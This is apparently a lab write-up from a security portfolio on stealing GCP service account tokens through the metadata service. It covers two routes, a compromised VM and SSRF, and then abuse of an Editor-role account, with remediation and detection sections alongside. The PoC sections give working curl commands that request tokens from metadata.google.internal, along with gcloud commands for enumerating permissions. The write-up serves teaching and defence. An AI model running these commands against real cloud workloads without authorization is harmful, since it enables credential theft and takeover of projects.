> **English** | [Italiano](README.md)

# GCP (Google Cloud Platform) - Metadata SSRF and Service Account Abuse

> - **Phase:** Cloud Security - GCP (IaaS & PaaS)
> - **Visibility:** Medium - the activities are recorded in Cloud Audit Logs; access to the metadata service from a compromised workload is harder to distinguish from legitimate traffic
> - **Prerequisites:** Access to a GCP resource (compromised VM/container) or credentials; for the SSRF, a vulnerable web app on GCP; gcloud CLI
> - **Output:** Finding CLOUD-004; service account token; access to the GCP services with the service account's permissions

- **Operating Environment:** GCP (author's lab project), gcloud CLI
- **Main tools:** gcloud, GCP metadata API, ScoutSuite

---

## Executive Summary

GCP organizes resources into **projects** and access around **Service Accounts** (SA): non-human identities assigned to resources (VMs, Cloud Functions, GKE) to access services. Like Azure's managed identities, service accounts eliminate hardcoded credentials but transfer the trust to the resource - and are the primary target of a GCP attack.

GCP's distinctive vector is access to the **metadata service** (`metadata.google.internal`), which exposes the token of the service account associated with the resource. Two paths lead to it: the direct compromise of the resource (a breached VM queries its own metadata), or - more insidious - an **SSRF (Server-Side Request Forgery)** on a web app running on GCP, which the attacker induces to query the metadata service on their behalf, extracting the token without even accessing the machine. Finding CLOUD-004 documents this token theft and the consequent abuse of the service account's permissions.

The principle, once again, is identity as the perimeter: a service account with excessive permissions turns an SSRF or a compromised VM into control of the GCP project.

---

## Folder Structure

```
GCP (Google Cloud Platform)/
+-- README.md      # this file: metadata SSRF + service account abuse (CLOUD-004)
+-- img/           # token theft and permission enumeration
```

---

## Theft of the Service Account Token via Metadata

**Finding ID:** `CLOUD-004` | **Severity:** `High` (theft of the service account token via metadata/SSRF; access to the GCP services with the SA's permissions - `Critical` if the SA is privileged)

### Operational Context

GCP's metadata service provides resources with the tokens of their service accounts. Whoever can make the metadata be queried (from the resource itself or by inducing it via SSRF) obtains an OAuth token with the permissions of the SA. The SSRF case is particularly serious because it does not require access to the machine: a web app that follows a URL provided by the attacker is enough.

### PoC - Token theft via metadata (from a compromised resource)

```Bash
# From a GCP VM: request of the service account token to the metadata service
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

```
{ "access_token": "ya29.c.b0...", "expires_in": 3599, "token_type": "Bearer" }
                                   <-- service account token (CLOUD-004)
```

### PoC - Theft via SSRF (without access to the machine)

```Bash
# Web app vulnerable to SSRF: the attacker induces it to query the metadata
curl "https://vuln-app.example/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "X-Forwarded-Header: ..."   # Metadata-Flavor header injected via SSRF
```

```
# The web app's response contains the SA token
"access_token": "ya29.c.b0..."   <-- token exfiltrated via SSRF, no VM access (CLOUD-004)
```

### PoC - Enumeration and abuse of the permissions

```Bash
# Use of the stolen token to enumerate what the service account can do
gcloud auth activate-service-account --key-file=<token>
gcloud projects get-iam-policy <project-id>
```

```
role: roles/editor
  members: serviceAccount:sa-web@project.iam.gserviceaccount.com   <-- SA with Editor role (CLOUD-004)
# "Editor" on the entire project = almost complete control of the resources
```

### Remediation

- **Least privilege on the service accounts:** minimal and granular roles (never "Editor"/"Owner" by default); a compromised SA must not give control of the project
- **Metadata protection:** GKE Workload Identity and metadata concealment protect the workloads; on GCE, restrict access to the metadata from the containers
- **SSRF prevention:** validate and restrict the outbound requests of the web apps (no access to `169.254.169.254`/`metadata.google.internal`); it is the control that breaks the SSRF-to-metadata vector
- **Detection:** ScoutSuite/Prowler for the audit of over-privileged SAs; Cloud Audit Logs for anomalous token use

---

## Lab Experience

The SSRF-to-metadata vector was the most instructive because it links two worlds of the path: web security (module 03) and cloud security. An SSRF, which on-premise could allow reaching internal services, becomes devastating in the cloud: the vulnerable web app becomes a proxy toward the metadata service, and the attacker steals the service account token without ever touching the machine. The same vulnerability changes gravity depending on the context - in the cloud, an SSRF is often a direct path to credential theft.

The symmetry with Azure was evident: metadata service, token of the managed identity, inherited permissions, all almost identical conceptually (IMDS on Azure, metadata.google.internal on GCP). This consolidated the cross-cutting cloud pattern: the non-human identities tied to the resources are convenient and widespread, and their token is always one step away from the metadata service. Whoever learns the vector on one provider finds it on the others.

---

## Theoretical Analysis: The SSRF as an Amplifier in the Cloud

The SSRF illustrates how a vulnerability changes gravity with the context. On-premise, an SSRF allows reaching internal, non-exposed services - serious, but limited. In the cloud, the same SSRF points to the metadata service, an endpoint that by design delivers credentials to whoever queries it from inside the resource. The SSRF turns the web app into that "whoever from inside", and the vulnerability goes from "access to internal services" to "cloud credential theft". The cloud context amplifies the impact.

The root is an implicit trust based on network position: the metadata service trusts anyone who reaches it from inside the resource, assuming it is the legitimate resource. It is the same error of network-based trust that the Zero Trust model criticizes: position (being "inside") should not confer trust. The SSRF exploits exactly this assumption, lending the web app its privileged position. The defense - restricting the outbound requests and protecting the metadata - is an application of the principle that no access should be granted based only on "where" it comes from.

---

## Real-World Scenario: Post-Exploitation Projection

> Attacker and defender perspectives.

### Attacker Perspective (Red Team)

**Projected kill chain:**

```
[CLOUD-004] SSRF on GCP web app -> service account token (Editor)
        |
        v
Access to the project resources: Cloud Storage, BigQuery, Compute
        |
        v
IAM enumeration -> search for more privileged SAs / impersonation
        |
        v
Data exfiltration / persistence / control of the GCP project
```

**Potential impact:** a service account with "Editor" or "Owner" role turns an SSRF into almost complete control of the project. Access to Cloud Storage and BigQuery exposes the data; the ability to create resources enables persistence and abuse (cryptomining). The pattern SSRF, metadata, privileged service account is one of the most documented cloud vectors.

### Defender Perspective (Blue Team)

**IOC:** requests to the metadata from web apps (SSRF pattern); use of SA tokens from anomalous IPs/contexts; unexpected IAM enumeration; creation of resources outside the normal processes.

**Hardening:** least privilege on the service accounts (never Editor/Owner by default); SSRF prevention in the web apps; Workload Identity on GKE; metadata concealment; continuous audit with ScoutSuite; Cloud Audit Logs with alerting.

**Defensive lesson:** in the cloud, an SSRF is a credential theft in potential. Two defenses break it on different levels: preventing the SSRF in the app (the vector) and limiting the service account's permissions (the impact). Defense in depth requires both - if one fails, the other contains the damage.

---

## Reference Tools

| Tool | Type | Role | Main use case |
| :--- | :--- | :--- | :--- |
| `gcloud` | Cloud CLI | Official | Interaction with the GCP APIs |
| GCP metadata API | Endpoint | Vector | Source of the service account tokens |
| `ScoutSuite` | Multi-cloud audit | Defensive | Audit of over-privileged SAs and misconfig |
| `GCP IAM Recommender` | Least privilege | Defensive | Suggestions to reduce the permissions |
| `Prowler` | Security scanner | Defensive | Security checks on GCP |

> **Recommended modern tool:** defensively `ScoutSuite` (`../../../Tooling/scoutsuite/`) for the multi-cloud audit and the native `IAM Recommender` for least privilege. SSRF prevention at the application level (module 03) is the countermeasure that breaks the vector at the root.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Credential Access | Steal Application Access Token | `T1528` | Theft of the service account token via metadata/SSRF (CLOUD-004) |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | `T1552.005` | Access to the metadata service to obtain the credentials (CLOUD-004) |
| Discovery | Cloud Infrastructure Discovery | `T1580` | Enumeration of the project resources and permissions |
| Privilege Escalation | Valid Accounts: Cloud Accounts | `T1078.004` | Abuse of the service account's permissions |

---

> **Note:** All documented activities were conducted on a GCP lab project owned by the author. Security testing on third-party projects requires explicit authorization and compliance with Google's terms. Techniques are documented for educational and authorized security assessment purposes.
